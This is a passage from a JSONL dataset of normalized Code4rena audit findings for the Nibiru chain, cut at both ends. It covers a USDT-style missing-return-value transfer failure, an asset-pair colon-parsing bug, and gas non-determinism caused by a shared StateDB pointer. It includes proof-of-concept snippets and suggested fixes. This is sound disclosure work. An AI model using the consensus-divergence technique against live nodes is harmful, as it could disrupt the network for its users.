e.ABI.UnpackIntoInterface(&erc20Bool, \"transfer\", resp.Ret); err != nil {\n            return balanceIncrease, nil, err\n        }\n        if !erc20Bool.Value {\n            return balanceIncrease, nil, fmt.Errorf(\"transfer executed but returned success=false\")\n        }\n    }\n    // No return data = transfer didn't revert, consider it successful\n\n    recipientBalanceAfter, err := e.BalanceOf(contract, to, ctx)\n    if err != nil {\n        return balanceIncrease, nil, errors.Wrap(err, \"failed to retrieve recipient balance\")\n    }\n\n    balanceIncrease = new(big.Int).Sub(recipientBalanceAfter, recipientBalanceBefore)\n    if balanceIncrease.Sign() <= 0 {\n        return balanceIncrease, nil, fmt.Errorf(\n            \"amount of ERC20 tokens received MUST be positive: the balance of recipient %s would've changed by %v for token %s\",\n            to.Hex(), balanceIncrease.String(), contract.Hex(),\n        )\n    }\n\n    return balanceIncrease, resp, nil\n}\n```\n\nThis makes the system compatible with both standard ERC20 tokens that return a boolean and non-standard tokens that don't return a value. The approach is similar to that used by established DeFi protocols that need to handle both types of tokens.\n", "poc_md": "## Proof of Concept\n\nThe issue occurs in [erc20.go:91-95](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/erc20.go#L91):\n\n```go\nvar erc20Bool ERC20Bool\nerr = e.ABI.UnpackIntoInterface(&erc20Bool, \"transfer\", resp.Ret)\nif err != nil {\n    return balanceIncrease, nil, err\n}\n```\n\nThe underlying `Unpack` function in the Ethereum ABI encoding will error when attempting to unpack empty return data if the ABI specifies a return value (`go-ethereum/accounts/abi/argument.go`):\n\n```go\nfunc (arguments Arguments) Unpack(data []byte) ([]interface{}, error) {\n    if len(data) == 0 {\n        if len(arguments.NonIndexed()) != 0 {\n            return nil, errors.New(\"abi: attempting to unmarshall an empty string while arguments are expected\")\n        }\n        return make([]interface{}, 0), nil\n    }\n    return arguments.UnpackValues(data)\n}\n```\n\nThis prevents transfers of tokens like USDT that don't return a value, even when the transfer itself succeeds.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/erc20.go#L91\n\n**container:**\n# Vulnerability details\n", "full_markdown_body": "https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/erc20.go#L91\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nThe `erc20.go` file assumes all ERC20 tokens return a boolean value from transfer operations, but some popular tokens like USDT, BNB, and OMG do not (https://github.com/d-xo/weird-erc20). These tokens are valid ERC20s but do not conform to the current standard of returning a boolean.\n\nWhen attempting to transfer such tokens, `UnpackIntoInterface` will call `Unpack` which fails when there is no return data but a return value is expected in the ABI. This causes the transfer to fail with an error, preventing users from transferring otherwise valid tokens through the system.\n\nAs noted in the contest scope, handling of \"Missing return values\" is explicitly in scope for this audit.\n\n## Proof of Concept\n\nThe issue occurs in [erc20.go:91-95](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/erc20.go#L91):\n\n```go\nvar erc20Bool ERC20Bool\nerr = e.ABI.UnpackIntoInterface(&erc20Bool, \"transfer\", resp.Ret)\nif err != nil {\n    return balanceIncrease, nil, err\n}\n```\n\nThe underlying `Unpack` function in the Ethereum ABI encoding will error when attempting to unpack empty return data if the ABI specifies a return value (`go-ethereum/accounts/abi/argument.go`):\n\n```go\nfunc (arguments Arguments) Unpack(data []byte) ([]interface{}, error) {\n    if len(data) == 0 {\n        if len(arguments.NonIndexed()) != 0 {\n            return nil, errors.New(\"abi: attempting to unmarshall an empty string while arguments are expected\")\n        }\n        return make([]interface{}, 0), nil\n    }\n    return arguments.UnpackValues(data)\n}\n```\n\nThis prevents transfers of tokens like USDT that don't return a value, even when the transfer itself succeeds.\n\n## Recommended mitigation steps\n\nModify the transfer function to consider a transfer successful if:\n1. The token returns true OR\n2. The token returns no value and the transfer didn't revert\n\n```go\nfunc (e erc20Calls) Transfer(\n    contract, from, to gethcommon.Address, amount *big.Int,\n    ctx sdk.Context,\n) (balanceIncrease *big.Int, resp *evm.MsgEthereumTxResponse, err error) {\n    recipientBalanceBefore, err := e.BalanceOf(contract, to, ctx)\n    if err != nil {\n        return balanceIncrease, nil, errors.Wrap(err, \"failed to retrieve recipient balance\")\n    }\n\n    resp, err = e.CallContract(ctx, e.ABI, from, &contract, true, Erc20GasLimitExecute, \"transfer\", to, amount)\n    if err != nil {\n        return balanceIncrease, nil, err\n    }\n\n    // If there's return data, try to unpack it\n    if len(resp.Ret) > 0 {\n        var erc20Bool ERC20Bool\n        if err := e.ABI.UnpackIntoInterface(&erc20Bool, \"transfer\", resp.Ret); err != nil {\n            return balanceIncrease, nil, err\n        }\n        if !erc20Bool.Value {\n            return balanceIncrease, nil, fmt.Errorf(\"transfer executed but returned success=false\")\n        }\n    }\n    // No return data = transfer didn't revert, consider it successful\n\n    recipientBalanceAfter, err := e.BalanceOf(contract, to, ctx)\n    if err != nil {\n        return balanceIncrease, nil, errors.Wrap(err, \"failed to retrieve recipient balance\")\n    }\n\n    balanceIncrease = new(big.Int).Sub(recipientBalanceAfter, recipientBalanceBefore)\n    if balanceIncrease.Sign() <= 0 {\n        return balanceIncrease, nil, fmt.Errorf(\n            \"amount of ERC20 tokens received MUST be positive: the balance of recipient %s would've changed by %v for token %s\",\n            to.Hex(), balanceIncrease.String(), contract.Hex(),\n        )\n    }\n\n    return balanceIncrease, resp, nil\n}\n```\n\nThis makes the system compatible with both standard ERC20 tokens that return a boolean and non-standard tokens that don't return a value. The approach is similar to that used by established DeFi protocols that need to handle both types of tokens.\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/erc20.go#L91\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nThe `erc20.go` file assumes all ERC20 tokens return a boolean value from transfer operations, but some popular tokens like USDT, BNB, and OMG do not (https://github.com/d-xo/weird-erc20). These tokens are valid ERC20s but do not conform to the current standard of returning a boolean.\n\nWhen attempting to transfer such tokens, `UnpackIntoInterface` will call `Unpack` which fails when there is no return data but a return value is expected in the ABI. This causes the transfer to fail with an error, preventing users from transferring otherwise valid tokens through the system.\n\nAs noted in the contest scope, handling of \"Missing return values\" is explicitly in scope for this audit.\n\n## Proof of Concept\n\nThe issue occurs in [erc20.go:91-95](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/erc20.go#L91):\n\n```go\nvar erc20Bool ERC20Bool\nerr = e.ABI.UnpackIntoInterface(&erc20Bool, \"transfer\", resp.Ret)\nif err != nil {\n    return balanceIncrease, nil, err\n}\n```\n\nThe underlying `Unpack` function in the Ethereum ABI encoding will error when attempting to unpack empty return data if the ABI specifies a return value (`go-ethereum/accounts/abi/argument.go`):\n\n```go\nfunc (arguments Arguments) Unpack(data []byte) ([]interface{}, error) {\n    if len(data) == 0 {\n        if len(arguments.NonIndexed()) != 0 {\n            return nil, errors.New(\"abi: attempting to unmarshall an empty string while arguments are expected\")\n        }\n        return make([]interface{}, 0), nil\n    }\n    return arguments.UnpackValues(data)\n}\n```\n\nThis prevents transfers of tokens like USDT that don't return a value, even when the transfer itself succeeds.\n\n## Recommended mitigation steps\n\nModify the transfer function to consider a transfer successful if:\n1. The token returns true OR\n2. The token returns no value and the transfer didn't revert\n\n```go\nfunc (e erc20Calls) Transfer(\n    contract, from, to gethcommon.Address, amount *big.Int,\n    ctx sdk.Context,\n) (balanceIncrease *big.Int, resp *evm.MsgEthereumTxResponse, err error) {\n    recipientBalanceBefore, err := e.BalanceOf(contract, to, ctx)\n    if err != nil {\n        return balanceIncrease, nil, errors.Wrap(err, \"failed to retrieve recipient balance\")\n    }\n\n    resp, err = e.CallContract(ctx, e.ABI, from, &contract, true, Erc20GasLimitExecute, \"transfer\", to, amount)\n    if err != nil {\n        return balanceIncrease, nil, err\n    }\n\n    // If there's return data, try to unpack it\n    if len(resp.Ret) > 0 {\n        var erc20Bool ERC20Bool\n        if err := e.ABI.UnpackIntoInterface(&erc20Bool, \"transfer\", resp.Ret); err != nil {\n            return balanceIncrease, nil, err\n        }\n        if !erc20Bool.Value {\n            return balanceIncrease, nil, fmt.Errorf(\"transfer executed but returned success=false\")\n        }\n    }\n    // No return data = transfer didn't revert, consider it successful\n\n    recipientBalanceAfter, err := e.BalanceOf(contract, to, ctx)\n    if err != nil {\n        return balanceIncrease, nil, errors.Wrap(err, \"failed to retrieve recipient balance\")\n    }\n\n    balanceIncrease = new(big.Int).Sub(recipientBalanceAfter, recipientBalanceBefore)\n    if balanceIncrease.Sign() <= 0 {\n        return balanceIncrease, nil, fmt.Errorf(\n            \"amount of ERC20 tokens received MUST be positive: the balance of recipient %s would've changed by %v for token %s\",\n            to.Hex(), balanceIncrease.String(), contract.Hex(),\n        )\n    }\n\n    return balanceIncrease, resp, nil\n}\n```\n\nThis makes the system compatible with both standard ERC20 tokens that return a boolean and non-standard tokens that don't return a value. The approach is similar to that used by established DeFi protocols that need to handle both types of tokens."}, "severity": "Medium", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/NibiruChain/nibiru", "org": "NibiruChain", "name": "nibiru", "commit": "f3cbcaec58f23c54f6b75204b0c4009856b47250", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-11-nibiru-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:15.445890+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:15.453827+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-11-nibiru-findings-055", "doc_id": "github:code-423n4/2024-11-nibiru-findings", "finding_index": 55, "page_start": null, "title": "Invalid Asset Pair Parsing Due to Colon Delimiter Conflict", "short_summary": null, "description_md": "## Finding description and impact\n\nThe code in the Oracle precompile's exchange rate query functionality to properly handle asset pair strings containing colons. The issue occurs because the system uses colons (`:`) as delimiters for asset pairs, but colons are also valid characters in Cosmos SDK denominations.\n\nThis issue manifests in the `queryExchangeRate` function where `TryNewPair()` is called to parse the asset pair string. The function splits the input string on the `:` character, assuming it's only used as a delimiter between the base and quote assets. However,  Cosmos SDK's `ValidateDenom()` allows colons in denomination names because of this validation regex in `coin.go` (within the Cosmos SDK):\n```go\n\t// Denominations can be 3 ~ 128 characters long and support letters, followed by either\n\t// a letter, a number or a separator ('/', ':', '.', '_' or '-').\n\treDnmString = `[a-zA-Z][a-zA-Z0-9/:._-]{2,127}`\n```\n\nThis means that whenever the precompile is used to query such a (valid) Cosmos SDK denom, it will return an error and it will never be possible to use these denoms when a price is needed.\n", "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/precompile/oracle.go#L87\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nThe code in the Oracle precompile's exchange rate query functionality to properly handle asset pair strings containing colons. The issue occurs because the system uses colons (`:`) as delimiters for asset pairs, but colons are also valid characters in Cosmos SDK denominations.\n\nThis issue manifests in the `queryExchangeRate` function where `TryNewPair()` is called to parse the asset pair string. The function splits the input string on the `:` character, assuming it's only used as a delimiter between the base and quote assets. However,  Cosmos SDK's `ValidateDenom()` allows colons in denomination names because of this validation regex in `coin.go` (within the Cosmos SDK):\n```go\n\t// Denominations can be 3 ~ 128 characters long and support letters, followed by either\n\t// a letter, a number or a separator ('/', ':', '.', '_' or '-').\n\treDnmString = `[a-zA-Z][a-zA-Z0-9/:._-]{2,127}`\n```\n\nThis means that whenever the precompile is used to query such a (valid) Cosmos SDK denom, it will return an error and it will never be possible to use these denoms when a price is needed.\n\n## Proof of Concept\n\nThe issue exists in the following code path:\n\n1. In [oracle.go:87](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/precompile/oracle.go#L87):\n```go\nassetPair, err := asset.TryNewPair(pair)\n```\n\n2. This calls into [pair.go:25-41](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/common/asset/pair.go#L25-L41):\n```go\nfunc TryNewPair(pair string) (Pair, error) {\n    split := strings.Split(pair, \":\")\n    splitLen := len(split)\n    if splitLen != 2 {\n        if splitLen == 1 {\n            return \"\", sdkerrors.Wrapf(ErrInvalidTokenPair,\n                \"pair separator missing for pair name, %v\", pair)\n        } else {\n            return \"\", sdkerrors.Wrapf(ErrInvalidTokenPair,\n                \"pair name %v must have exactly two assets, not %v\", pair, splitLen)\n        }\n    }\n    // ...\n}\n```\nThe validation within `TryNewPair`  returns an error when the split returns more than two entries.\n\nConsider the following example that demonstrates the issue:\n\n```go\n// Valid Cosmos SDK denomination containing a colon\nvalidDenom := \"ibc:transfer/channel-0/unibi\"\nquoteDenom := \"usd\"\n\n// Attempt to create pair \"ibc:transfer/channel-0/unibi:usd\"\npair := validDenom + \":\" + quoteDenom\n\n// This will fail because strings.Split() will create three parts:\n// [\"ibc\", \"transfer/channel-0/unibi\", \"usd\"]\n// TryNewPair will return an error since it expects exactly 2 parts\nassetPair, err := asset.TryNewPair(pair)\n// err will be \"pair name must have exactly two assets, not 3\"\n```\n\nThis demonstrates how a valid denomination name containing a colon will be incorrectly split and rejected, even though it should be a valid asset pair according to Cosmos SDK denomination rules.\n\n## Recommended mitigation steps\n\nThere are several possible approaches to mitigate this issue:\n\n1. **Use a different delimiter:**\n   Replace the colon delimiter with a character that's guaranteed to be invalid in Cosmos SDK denominations.\n\n2. **Implement escape sequence handling:**\n   Modify the parsing logic to handle escaped colons in denomination names:\n\n```go\nfunc TryNewPair(pair string) (Pair, error) {\n    // Replace escaped colons with a temporary placeholder\n    escaped := strings.ReplaceAll(pair, \"\\\\:\", \"\\x00\")\n\n    // Split on unescaped colons\n    parts := strings.Split(escaped, \":\")\n\n    // Restore escaped colons\n    for i := range parts {\n        parts[i] = strings.ReplaceAll(parts[i], \"\\x00\", \":\")\n    }\n\n    // Continue with validation...\n}\n```\n\n3. **Use structured input:**\n   Instead of using string concatenation with delimiters, modify the interface to accept base and quote denominations as separate parameters:\n\n```go\nfunc NewPair(base string, quote string) Pair {\n    return Pair{\n        BaseDenom:  base,\n        QuoteDenom: quote,\n    }\n}\n```\n", "sections": {"description_md": "## Finding description and impact\n\nThe code in the Oracle precompile's exchange rate query functionality to properly handle asset pair strings containing colons. The issue occurs because the system uses colons (`:`) as delimiters for asset pairs, but colons are also valid characters in Cosmos SDK denominations.\n\nThis issue manifests in the `queryExchangeRate` function where `TryNewPair()` is called to parse the asset pair string. The function splits the input string on the `:` character, assuming it's only used as a delimiter between the base and quote assets. However,  Cosmos SDK's `ValidateDenom()` allows colons in denomination names because of this validation regex in `coin.go` (within the Cosmos SDK):\n```go\n\t// Denominations can be 3 ~ 128 characters long and support letters, followed by either\n\t// a letter, a number or a separator ('/', ':', '.', '_' or '-').\n\treDnmString = `[a-zA-Z][a-zA-Z0-9/:._-]{2,127}`\n```\n\nThis means that whenever the precompile is used to query such a (valid) Cosmos SDK denom, it will return an error and it will never be possible to use these denoms when a price is needed.\n", "impact_md": null, "recommendation_md": "## Recommended mitigation steps\n\nThere are several possible approaches to mitigate this issue:\n\n1. **Use a different delimiter:**\n   Replace the colon delimiter with a character that's guaranteed to be invalid in Cosmos SDK denominations.\n\n2. **Implement escape sequence handling:**\n   Modify the parsing logic to handle escaped colons in denomination names:\n\n```go\nfunc TryNewPair(pair string) (Pair, error) {\n    // Replace escaped colons with a temporary placeholder\n    escaped := strings.ReplaceAll(pair, \"\\\\:\", \"\\x00\")\n\n    // Split on unescaped colons\n    parts := strings.Split(escaped, \":\")\n\n    // Restore escaped colons\n    for i := range parts {\n        parts[i] = strings.ReplaceAll(parts[i], \"\\x00\", \":\")\n    }\n\n    // Continue with validation...\n}\n```\n\n3. **Use structured input:**\n   Instead of using string concatenation with delimiters, modify the interface to accept base and quote denominations as separate parameters:\n\n```go\nfunc NewPair(base string, quote string) Pair {\n    return Pair{\n        BaseDenom:  base,\n        QuoteDenom: quote,\n    }\n}\n```\n", "poc_md": "## Proof of Concept\n\nThe issue exists in the following code path:\n\n1. In [oracle.go:87](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/precompile/oracle.go#L87):\n```go\nassetPair, err := asset.TryNewPair(pair)\n```\n\n2. This calls into [pair.go:25-41](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/common/asset/pair.go#L25-L41):\n```go\nfunc TryNewPair(pair string) (Pair, error) {\n    split := strings.Split(pair, \":\")\n    splitLen := len(split)\n    if splitLen != 2 {\n        if splitLen == 1 {\n            return \"\", sdkerrors.Wrapf(ErrInvalidTokenPair,\n                \"pair separator missing for pair name, %v\", pair)\n        } else {\n            return \"\", sdkerrors.Wrapf(ErrInvalidTokenPair,\n                \"pair name %v must have exactly two assets, not %v\", pair, splitLen)\n        }\n    }\n    // ...\n}\n```\nThe validation within `TryNewPair`  returns an error when the split returns more than two entries.\n\nConsider the following example that demonstrates the issue:\n\n```go\n// Valid Cosmos SDK denomination containing a colon\nvalidDenom := \"ibc:transfer/channel-0/unibi\"\nquoteDenom := \"usd\"\n\n// Attempt to create pair \"ibc:transfer/channel-0/unibi:usd\"\npair := validDenom + \":\" + quoteDenom\n\n// This will fail because strings.Split() will create three parts:\n// [\"ibc\", \"transfer/channel-0/unibi\", \"usd\"]\n// TryNewPair will return an error since it expects exactly 2 parts\nassetPair, err := asset.TryNewPair(pair)\n// err will be \"pair name must have exactly two assets, not 3\"\n```\n\nThis demonstrates how a valid denomination name containing a colon will be incorrectly split and rejected, even though it should be a valid asset pair according to Cosmos SDK denomination rules.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/precompile/oracle.go#L87\n\n**container:**\n# Vulnerability details\n", "full_markdown_body": "https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/precompile/oracle.go#L87\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nThe code in the Oracle precompile's exchange rate query functionality to properly handle asset pair strings containing colons. The issue occurs because the system uses colons (`:`) as delimiters for asset pairs, but colons are also valid characters in Cosmos SDK denominations.\n\nThis issue manifests in the `queryExchangeRate` function where `TryNewPair()` is called to parse the asset pair string. The function splits the input string on the `:` character, assuming it's only used as a delimiter between the base and quote assets. However,  Cosmos SDK's `ValidateDenom()` allows colons in denomination names because of this validation regex in `coin.go` (within the Cosmos SDK):\n```go\n\t// Denominations can be 3 ~ 128 characters long and support letters, followed by either\n\t// a letter, a number or a separator ('/', ':', '.', '_' or '-').\n\treDnmString = `[a-zA-Z][a-zA-Z0-9/:._-]{2,127}`\n```\n\nThis means that whenever the precompile is used to query such a (valid) Cosmos SDK denom, it will return an error and it will never be possible to use these denoms when a price is needed.\n\n## Proof of Concept\n\nThe issue exists in the following code path:\n\n1. In [oracle.go:87](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/precompile/oracle.go#L87):\n```go\nassetPair, err := asset.TryNewPair(pair)\n```\n\n2. This calls into [pair.go:25-41](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/common/asset/pair.go#L25-L41):\n```go\nfunc TryNewPair(pair string) (Pair, error) {\n    split := strings.Split(pair, \":\")\n    splitLen := len(split)\n    if splitLen != 2 {\n        if splitLen == 1 {\n            return \"\", sdkerrors.Wrapf(ErrInvalidTokenPair,\n                \"pair separator missing for pair name, %v\", pair)\n        } else {\n            return \"\", sdkerrors.Wrapf(ErrInvalidTokenPair,\n                \"pair name %v must have exactly two assets, not %v\", pair, splitLen)\n        }\n    }\n    // ...\n}\n```\nThe validation within `TryNewPair`  returns an error when the split returns more than two entries.\n\nConsider the following example that demonstrates the issue:\n\n```go\n// Valid Cosmos SDK denomination containing a colon\nvalidDenom := \"ibc:transfer/channel-0/unibi\"\nquoteDenom := \"usd\"\n\n// Attempt to create pair \"ibc:transfer/channel-0/unibi:usd\"\npair := validDenom + \":\" + quoteDenom\n\n// This will fail because strings.Split() will create three parts:\n// [\"ibc\", \"transfer/channel-0/unibi\", \"usd\"]\n// TryNewPair will return an error since it expects exactly 2 parts\nassetPair, err := asset.TryNewPair(pair)\n// err will be \"pair name must have exactly two assets, not 3\"\n```\n\nThis demonstrates how a valid denomination name containing a colon will be incorrectly split and rejected, even though it should be a valid asset pair according to Cosmos SDK denomination rules.\n\n## Recommended mitigation steps\n\nThere are several possible approaches to mitigate this issue:\n\n1. **Use a different delimiter:**\n   Replace the colon delimiter with a character that's guaranteed to be invalid in Cosmos SDK denominations.\n\n2. **Implement escape sequence handling:**\n   Modify the parsing logic to handle escaped colons in denomination names:\n\n```go\nfunc TryNewPair(pair string) (Pair, error) {\n    // Replace escaped colons with a temporary placeholder\n    escaped := strings.ReplaceAll(pair, \"\\\\:\", \"\\x00\")\n\n    // Split on unescaped colons\n    parts := strings.Split(escaped, \":\")\n\n    // Restore escaped colons\n    for i := range parts {\n        parts[i] = strings.ReplaceAll(parts[i], \"\\x00\", \":\")\n    }\n\n    // Continue with validation...\n}\n```\n\n3. **Use structured input:**\n   Instead of using string concatenation with delimiters, modify the interface to accept base and quote denominations as separate parameters:\n\n```go\nfunc NewPair(base string, quote string) Pair {\n    return Pair{\n        BaseDenom:  base,\n        QuoteDenom: quote,\n    }\n}\n```\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/precompile/oracle.go#L87\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nThe code in the Oracle precompile's exchange rate query functionality to properly handle asset pair strings containing colons. The issue occurs because the system uses colons (`:`) as delimiters for asset pairs, but colons are also valid characters in Cosmos SDK denominations.\n\nThis issue manifests in the `queryExchangeRate` function where `TryNewPair()` is called to parse the asset pair string. The function splits the input string on the `:` character, assuming it's only used as a delimiter between the base and quote assets. However,  Cosmos SDK's `ValidateDenom()` allows colons in denomination names because of this validation regex in `coin.go` (within the Cosmos SDK):\n```go\n\t// Denominations can be 3 ~ 128 characters long and support letters, followed by either\n\t// a letter, a number or a separator ('/', ':', '.', '_' or '-').\n\treDnmString = `[a-zA-Z][a-zA-Z0-9/:._-]{2,127}`\n```\n\nThis means that whenever the precompile is used to query such a (valid) Cosmos SDK denom, it will return an error and it will never be possible to use these denoms when a price is needed.\n\n## Proof of Concept\n\nThe issue exists in the following code path:\n\n1. In [oracle.go:87](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/precompile/oracle.go#L87):\n```go\nassetPair, err := asset.TryNewPair(pair)\n```\n\n2. This calls into [pair.go:25-41](https://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/common/asset/pair.go#L25-L41):\n```go\nfunc TryNewPair(pair string) (Pair, error) {\n    split := strings.Split(pair, \":\")\n    splitLen := len(split)\n    if splitLen != 2 {\n        if splitLen == 1 {\n            return \"\", sdkerrors.Wrapf(ErrInvalidTokenPair,\n                \"pair separator missing for pair name, %v\", pair)\n        } else {\n            return \"\", sdkerrors.Wrapf(ErrInvalidTokenPair,\n                \"pair name %v must have exactly two assets, not %v\", pair, splitLen)\n        }\n    }\n    // ...\n}\n```\nThe validation within `TryNewPair`  returns an error when the split returns more than two entries.\n\nConsider the following example that demonstrates the issue:\n\n```go\n// Valid Cosmos SDK denomination containing a colon\nvalidDenom := \"ibc:transfer/channel-0/unibi\"\nquoteDenom := \"usd\"\n\n// Attempt to create pair \"ibc:transfer/channel-0/unibi:usd\"\npair := validDenom + \":\" + quoteDenom\n\n// This will fail because strings.Split() will create three parts:\n// [\"ibc\", \"transfer/channel-0/unibi\", \"usd\"]\n// TryNewPair will return an error since it expects exactly 2 parts\nassetPair, err := asset.TryNewPair(pair)\n// err will be \"pair name must have exactly two assets, not 3\"\n```\n\nThis demonstrates how a valid denomination name containing a colon will be incorrectly split and rejected, even though it should be a valid asset pair according to Cosmos SDK denomination rules.\n\n## Recommended mitigation steps\n\nThere are several possible approaches to mitigate this issue:\n\n1. **Use a different delimiter:**\n   Replace the colon delimiter with a character that's guaranteed to be invalid in Cosmos SDK denominations.\n\n2. **Implement escape sequence handling:**\n   Modify the parsing logic to handle escaped colons in denomination names:\n\n```go\nfunc TryNewPair(pair string) (Pair, error) {\n    // Replace escaped colons with a temporary placeholder\n    escaped := strings.ReplaceAll(pair, \"\\\\:\", \"\\x00\")\n    \n    // Split on unescaped colons\n    parts := strings.Split(escaped, \":\")\n    \n    // Restore escaped colons\n    for i := range parts {\n        parts[i] = strings.ReplaceAll(parts[i], \"\\x00\", \":\")\n    }\n    \n    // Continue with validation...\n}\n```\n\n3. **Use structured input:**\n   Instead of using string concatenation with delimiters, modify the interface to accept base and quote denominations as separate parameters:\n\n```go\nfunc NewPair(base string, quote string) Pair {\n    return Pair{\n        BaseDenom:  base,\n        QuoteDenom: quote,\n    }\n}\n```"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/NibiruChain/nibiru", "org": "NibiruChain", "name": "nibiru", "commit": "f3cbcaec58f23c54f6b75204b0c4009856b47250", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-11-nibiru-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:15.445890+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:15.453827+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-11-nibiru-findings-057", "doc_id": "github:code-423n4/2024-11-nibiru-findings", "finding_index": 57, "page_start": null, "title": "Non-deterministic gas consumption due to shared StateDB pointer in bank keeper affecting consensus", "short_summary": null, "description_md": "## Finding description and impact\n\nAn issue exists in Nibiru's implementation of the bank keeper and its interaction with the EVM's StateDB. The `NibiruBankKeeper` maintains a pointer field to `StateDB` that gets updated during read-only EVM operations (like `eth_estimateGas`), which then affects the gas computation of subsequent bank transactions.\n\nThe issue arises because the `StateDB` pointer in `NibiruBankKeeper` is modified during read-only operations, and the presence or absence of this pointer affects program flow in bank operations through nil checks:\n\n```go\nfunc (bk *NibiruBankKeeper) SyncStateDBWithAccount(ctx sdk.Context, acc sdk.AccAddress) {\n    // If there's no StateDB set, it means we're not in an EthereumTx.\n    if bk.StateDB == nil {\n        return\n    }\n    // ... state updates\n}\n```\n\nThis can lead to consensus failures as different nodes may compute different gas amounts for the same transaction (depending on if they previously executed a read only query via RPC), which should never happen.\n", "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/84054a4f00fdfefaa8e5849c53eb66851a762319/x/evm/keeper/bank_extension.go#L84-L86\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nAn issue exists in Nibiru's implementation of the bank keeper and its interaction with the EVM's StateDB. The `NibiruBankKeeper` maintains a pointer field to `StateDB` that gets updated during read-only EVM operations (like `eth_estimateGas`), which then affects the gas computation of subsequent bank transactions.\n\nThe issue arises because the `StateDB` pointer in `NibiruBankKeeper` is modified during read-only operations, and the presence or absence of this pointer affects program flow in bank operations through nil checks:\n\n```go\nfunc (bk *NibiruBankKeeper) SyncStateDBWithAccount(ctx sdk.Context, acc sdk.AccAddress) {\n    // If there's no StateDB set, it means we're not in an EthereumTx.\n    if bk.StateDB == nil {\n        return\n    }\n    // ... state updates\n}\n```\n\nThis can lead to consensus failures as different nodes may compute different gas amounts for the same transaction (depending on if they previously executed a read only query via RPC), which should never happen.\n\n## Proof of Concept\n\nThe vulnerability can be demonstrated through the following sequence:\n\n1. Initial state: Execute a bank send transaction and record gas used\n```go\n// Initial bank send\nsendMsg := banktypes.NewMsgSend(sender, receiver, coins)\ngasUsed1 := executeTx(sendMsg) // Records initial gas usage\n```\n\n2. Trigger a read-only operation that modifies the StateDB pointer\n```go\n// This can modify NibiruBankKeeper.StateDB depending on the tx content\nclient.EstimateGas(ethTx)\n```\n\n3. Execute the same bank send transaction again\n```go\ngasUsed2 := executeTx(sendMsg) // Different gas usage than gasUsed1 because bk.StateDB is no longer nil\n```\n\nThe key problematic code is in 